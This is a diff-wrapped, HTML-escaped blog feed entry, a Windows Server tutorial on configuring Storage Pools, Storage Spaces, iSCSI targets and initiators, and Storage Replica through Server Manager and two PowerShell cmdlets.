-&lt;p&gt;Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.&lt;/p&gt;
-
-&lt;p&gt;Storage pools are a type of software defined storage system that takes multiple physical devices and creates a single Pool resource to create virtual ‘logical’ volumes from. Imagine having 3 harddrives 2 GB a piece. Then you collect their storage capabilities together to then create something like 2 VHDs with 3GB of space each. This is &lt;em&gt;sort of&lt;/em&gt; how Storage Pools work.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-|--------------------------|--------------------------|
-|                          |                          |
-|          3GB             |          3GB             | ----- Logical Volumes
-|                          |                          |
-|--------------------------|--------------------------|
-|-----------------------------------------------------|
-|                                                     |
-|                         6GB                         | ----- Volume Pool
-|                                                     |
-|-----------------------------------------------------|
-|-----------------|-----------------|-----------------|
-|                 |                 |                 |
-|       2GB       |       2GB       |       2GB       | ----- Physical Volumes
-|                 |                 |                 |
-|-----------------|-----------------|-----------------|
-
-
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;There are ways to arrange the pool’s resources such that instead of just adding up all the space, you use some of the space as a redudant system to create a failsafe. Pools can allow for a drive to completely fail and the data saved onto that logical volume still be accessible.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Note: this look familiar if you’ve used LVM before. Same concepts. It’s all software defined storage.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;adding-the-feature&quot;&gt;Adding the Feature&lt;/h3&gt;
-
-&lt;p&gt;As done before, make sure that the File and Storage Services feature is installed from the Server Manager &amp;gt; Manage &amp;gt; Add Roles and Features.&lt;/p&gt;
-
-&lt;h3 id=&quot;configuring-storage-pools-and-storage-spaces&quot;&gt;Configuring Storage Pools and Storage Spaces&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;In Server Manager head to File and Storage Services&lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/2.png&quot; alt=&quot;Go to file and storage services&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;Select the Storage Pools option from the left menu&lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/3.png&quot; alt=&quot;Go to Storage pools&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;In the top right corner select TASKS and then New Storage Pool&lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/4.png&quot; alt=&quot;go to tasks and new storage pool&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;Now give this new pool a name and select which group of disks you’d like to use.
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/5.png&quot; alt=&quot;name it&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;Now you should be able to add the disk you’d like to use in this pool. You have options for allocation for setting up hot swaps if needed. &lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/6.png&quot; alt=&quot;add physical disks (you need three for RAID5)&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;Review the summary and click create&lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/7.png&quot; alt=&quot;confirm&quot; /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;creating-volumes-in-the-pool&quot;&gt;Creating volumes in the pool&lt;/h3&gt;
-
-&lt;p&gt;Now that your physical drives are being used in a pool, you’ll need to create logical volumes or virtual drives to be able to utilize the storage.&lt;/p&gt;
-
-&lt;h3 id=&quot;creating-a-virtual-disk-in-the-pool&quot;&gt;Creating a Virtual Disk in the Pool&lt;/h3&gt;
-&lt;p&gt;So now you can see that you have a new storage pool but under it there is a section for Virtual Disks, and it’s empty.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Click Tasks and click create new virtual disk. Or you can click the &lt;em&gt;New Virtual Disk Wizard&lt;/em&gt; link within the virtual disk section. 
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/8.png&quot; alt=&quot;New Virtual Disk Wizard Link&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;It will then ask you to select the pool that you’d like to use. 
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/10.png&quot; alt=&quot;Selecting a pool&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;This next section is the layout section. Choose between:
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Simple - no fail safe, allows for the most space usage
-Mirror - Drive is mirror onto other drives so if a failure happens, it can be found on another drive. *(this comes in a two way or three way flavor. Allowing for two drives to fail)*
-Parity - Works against single drive failures. 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/11.png&quot; alt=&quot;Selecting Layout&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;Select if you’d like to thin provision or a typical fixed provision. 
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/12.png&quot; alt=&quot;Privisioning Type setup&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;set the drive’s size.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/storagespaces/13.png&quot; alt=&quot;Selecting Size&quot; /&gt;&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Now just review your options before you finish. &lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/14.png&quot; alt=&quot;Confirm options&quot; /&gt;&lt;/li&gt;
-  &lt;li&gt;The Wizard will now create your virtual disk and you should be able to find it in the Server Manager under the File and Storage Manager. &lt;br /&gt;
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/15.png&quot; alt=&quot;New Virtual Disk in Manager&quot; /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;iscsi-storage&quot;&gt;iSCSI Storage&lt;/h2&gt;
-&lt;p&gt;With iSCSI you will have the iSCSI disk, target, and initiator. This can be very confusing at first. Let’s clear that up.&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Disk&lt;/strong&gt; - The disk does not mean that it’s a physical iSCSI disk. What we are talking about is a VHD that is setup to communication using iSCSI&lt;br /&gt;
-&lt;strong&gt;Target&lt;/strong&gt; - The target is esentailly the iSCSI server. It will be where machines communicate to access the iSCSI resource.&lt;br /&gt;
-&lt;strong&gt;Initiator&lt;/strong&gt; - these are the machines on the network that ‘initiate’ a connection to the &lt;em&gt;Target&lt;/em&gt; to get access to the iSCSI Drive.&lt;/p&gt;
-
-&lt;h3 id=&quot;creating-a-iscsi-virtual-disk&quot;&gt;Creating a iSCSI Virtual Disk&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;I’ll be skipping the iSCSI Role installation. The specific option you will want is the &lt;strong&gt;&lt;em&gt;iSCSI Services&lt;/em&gt;&lt;/strong&gt; with the &lt;strong&gt;&lt;em&gt;iSCSI Target Server&lt;/em&gt;&lt;/strong&gt; selection&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;In the iSCSI section of the File and Storage Services Server Manager interface. Click &lt;em&gt;TASKS&lt;/em&gt; and create a new iSCSI Virtual Disk&lt;/li&gt;
-  &lt;li&gt;Select the volume you’d like to use.&lt;/li&gt;
-  &lt;li&gt;Give it a name&lt;/li&gt;
-  &lt;li&gt;Select the size and the space allocation type.&lt;/li&gt;
-  &lt;li&gt;You’ll now start making the Target. Click New iSCSI target&lt;/li&gt;
-  &lt;li&gt;Give it a name. You can use the &lt;em&gt;lon&lt;/em&gt; naming convention to help keep things organized.&lt;/li&gt;
-  &lt;li&gt;You will now add the iniatiator. Remember the initiator is the machine that will access this drive. You can add it by it’s name on the domain or by it’s IP address. 
-&lt;img src=&quot;/assets/img/servergifs/storagespaces/16.png&quot; alt=&quot;Setting up Initator&quot; /&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Note: The iniatiator will actually have to iniate the connection. This is just setting up who can be iniatiators.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;You can setup CHAP to authenticate. This is a good security measure but doesn’t have to be setup for it to work. In the lab, you can skip this.&lt;/li&gt;
-  &lt;li&gt;Review your setup and complete.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;You’ll see that the iSCSI section of the File and Storage Services will show that it clears the disk and then shows who is connected to it. For now it shouldn’t be connected to anyone.&lt;/p&gt;
-
-&lt;h3 id=&quot;iscsi-initiator&quot;&gt;iSCSI Initiator&lt;/h3&gt;
-&lt;p&gt;On another machine that you’d like to access the iSCSI drive from. You will use the iSCSI Initiator application to make this connection. You can find this in Tools within the Server Manager or you can search for it in the start bar on other Windows machines.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;For your target, enter in either the host name with the domain, or use it’s IP address to search for that machine under quick connect.&lt;/li&gt;
-  &lt;li&gt;If you setup the Initiator in the previous section. You should see &lt;em&gt;Login Succeeded.&lt;/em&gt; in the Progress Report section.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Note: before accessing the iSCSI drive, you will have to bring it online in Disk Management. It will not have allocated space and it will not be initialized as a disk. Set up this disk like a typical disk and give it a new volume before you can access it. &lt;em&gt;See my post on volumes to see more on how to do this&lt;/em&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;You’re done!&lt;/p&gt;
-
-&lt;h3 id=&quot;giving-your-iscsi-isns-domain-set-and-zone&quot;&gt;Giving your iSCSI iSNS Domain set and zone.&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;You can setup an iSNS server to give your iSCSI targets a domain name on your network. iSNS creates nodes with targets, disks, and initiators. You can give them zones and sets within the Domain called Discovery Domains. I won’t cover this now but it can be pretty useful.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;storage-replica&quot;&gt;Storage Replica&lt;/h2&gt;
-&lt;p&gt;Storage Replica is a feature that allows two servers create a complete block level copy over SMB between two drives. AKA a image quality copy over the network. It doesn’t use a snapshot type technology, but constantly sends data over. This is good for disastery recovery and for log backups, databases, etc.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;This is not drive sharing. This is creating a copy of a drive from one drive to another.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;add-the-feature-first&quot;&gt;Add the feature first&lt;/h3&gt;
-&lt;ul&gt;
-  &lt;li&gt;In Add Roles and Features. Find and add Storage Relica.&lt;/li&gt;
-  &lt;li&gt;On the server you are creating a replica with. Do the same process.&lt;/li&gt;
-  &lt;li&gt;reboot both machines.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;configuring-in-powershell&quot;&gt;Configuring in Powershell&lt;/h3&gt;
-&lt;p&gt;There aren’t any GUI options for Storage Replica. You’ll have to do this in powershell.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;New-SRPartnership -SourceComputerName &amp;lt;Name&amp;gt; -SourceRGNName &amp;lt;Name&amp;gt; Source RG -sourceVolumeName &amp;lt;Drive Letter&amp;gt; -SourceLogVolumeName &amp;lt;Letter for replica&amp;gt; DestinationRG -DestinationVolume &amp;lt;Drive Letter&amp;gt; DestinationLogVolume &amp;lt;Drive Letter&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;SRPartnership is the relationship between two machines with Storage Replica running. This command creates that relationship.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Note: if you use computer names in this, you will need to make sure your DNS is working. Otherwise you can use IP addresses&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Run the commanlet and wait for it to complete with an output of the summary.&lt;/p&gt;
-
-&lt;p&gt;To check to see if your Storage Replica is working you can run this Powershell command:&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(Get-SRGroup).Replicas | Select-Object Numofbyesremaining
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;It will show how many bytes are left as it copies itself over.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Storage Replicas are great in combination with Failover to allow for a strong redudant system.&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Software Defined Storage &amp;amp; Storage Pools Storage Pools and Storage spaces helps an admin to manage the storage infrastructure with in an enterprise environment. Before installing and configuring here is a quick overview.</summary></entry></feed>
+&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry></feed>
